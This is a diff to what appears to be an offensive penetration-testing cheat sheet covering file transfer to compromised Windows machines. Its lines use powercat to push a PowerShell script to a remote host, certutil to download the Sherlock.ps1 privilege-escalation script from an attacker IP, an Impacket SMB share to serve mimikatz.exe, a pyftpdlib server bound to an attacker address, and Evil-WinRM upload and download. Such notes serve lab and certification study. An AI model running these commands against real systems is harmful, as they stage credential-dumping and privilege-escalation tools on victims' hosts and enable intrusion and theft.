@@ -67,7 +67,7 @@ powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
 ## Certutil
 
 ```
-certutil.exe -urlcache -f http://<IP>/Sherlock.ps1 Sherlock,ps1
+certutil.exe -urlcache -split -f http://<IP>/Sherlock.ps1 Sherlock,ps1
 ```
 
 ## Impacket SMB
@@ -80,4 +80,18 @@ impacket-smbserver share . -smb2support
 \\10.10.10.10\share\mimikatz.exe 
 
 copy \\10.10.10.10\share\mimikatz.exe 
+```
+
+## FTP
+
+```
+python -m pyftpdlib 21 <ATTACKER IP>
+ftp 10.10.10.10
+```
+
+## Evil-WinRM
+
+```
+upload
+download
 ```
